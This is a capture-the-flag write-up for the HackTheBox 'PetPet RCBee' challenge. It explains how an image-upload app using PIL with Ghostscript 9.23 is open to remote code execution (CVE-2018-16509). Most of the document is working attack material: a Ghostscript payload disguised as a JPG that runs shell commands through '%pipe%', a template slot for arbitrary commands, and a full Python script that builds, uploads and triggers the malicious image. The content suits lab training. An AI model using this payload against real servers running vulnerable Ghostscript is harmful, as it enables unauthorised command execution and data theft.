#  PetPet RCBee HTB Challenge 

__________________________________________

In this Website we can upload images.
From the source code we can see that the app is importing "**PIL**" that is a component that use ghostscript-9.23 in this case.

### VULN

This version of ghostscript is vulnerable to RCE.
- https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509/tree/master

## POC

Crafting a jpg image like this will execute code in the server:

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%<RCE HERE>) currentdevice putdeviceprops
```

So we can just copy the flag from /app/flag to /app/application/static/petpets/flag.txt then navigato to /static/petpets/flag.txt to retrieve the flag.

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cp /app/flag /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
```

#### Python Script
```python
import requests
import sys

if len(sys.argv) != 2:
    print("Usage: python3 script.py <URL>")
    sys.exit(1)

url = sys.argv[1]

# Aggiungi "http://" all'URL se mancante.
if not url.startswith('http://') and not url.startswith('https://'):
    url = 'http://' + url

# Make the Evil JPG to upload

content = '''%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cp /app/flag /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
'''

with open("bad_image.jpg", "w") as file:
    file.write(content)

print("The Image 'bad_image.jpg' has been saved in the current directory")
print("Ready to upload to the victim machine!")

# UPLOAD the image
upload_url = f'{url}/api/upload'
payload = {'file': open('bad_image.jpg', 'rb')}
response_upload = requests.post(upload_url, files=payload)

if response_upload.status_code == 200:
    print("Image Uploaded!")

    # Get the flag from "static/petpets/flag.txt".
    get_url = f'{url}/static/petpets/flag.txt'
    response_get = requests.get(get_url)

    if response_get.status_code == 200:
        print('Your Flag:')
        print(response_get.text)
    else:
        print(f'Errore {response_get.status_code}: File "flag.txt" not found')
else:
    print(f'Error {response_upload.status_code}: Image Has Not Been Uploaded, check the IP or your connection.')
```